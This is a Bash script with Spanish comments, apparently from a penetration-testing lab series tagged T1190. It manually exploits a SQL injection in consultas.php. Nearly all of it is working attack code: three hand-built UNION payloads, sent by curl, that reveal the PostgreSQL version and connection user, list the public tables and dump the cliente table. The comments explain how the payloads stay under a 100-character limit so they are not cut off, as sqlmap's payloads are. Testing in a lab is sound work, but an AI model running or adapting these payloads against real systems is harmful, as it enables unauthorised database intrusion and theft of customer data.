#!/usr/bin/env bash
# T1190 — Explotación manual de la inyección SQL en consultas.php, sin sqlmap.
#
# Por qué existe este script además de 03_sqlmap.sh:
# consultas.php valida que $busqueda tenga <= 100 caracteres. Los payloads
# automáticos de sqlmap casi siempre superan ese límite y se cortan antes de
# llegar a la base de datos, por lo que sqlmap reporta "no injectable" aunque
# la inyección sí existe. Estos payloads están armados a mano para quedar
# bajo ese límite y confirman la explotación real, paso a paso.
source "$(dirname "$0")/../config.sh"

LOG="../evidencia/03b_sqli_manual_$(date +%Y%m%d_%H%M).log"
URL="http://$TARGET_WEB/consultas.php"

run_payload() {
  local titulo="$1"
  local payload="$2"
  {
    echo "=== $titulo ==="
    echo "Payload (${#payload} caracteres): $payload"
    curl -s -G "$URL" --data-urlencode "busqueda=$payload" | grep -A2 '<li>'
    echo
  } | tee -a "$LOG"
}

echo "[T1190] Explotación manual de inyección SQL en $URL" | tee "$LOG"
echo "Requiere que agent-db esté arriba (la app depende de esa conexión)." | tee -a "$LOG"
echo | tee -a "$LOG"

run_payload "1. Confirmar inyección + versión + usuario de conexión" \
  "xyz' UNION SELECT 1, version() || ' | user: ' || current_user --"

run_payload "2. Listar tablas del esquema público" \
  "xyz' UNION SELECT 1,string_agg(tablename,',') FROM pg_tables WHERE schemaname='public'--"

run_payload "3. Volcar datos reales de la tabla cliente" \
  "xyz' UNION SELECT id,nombre FROM cliente--"

echo "Evidencia guardada en $LOG"
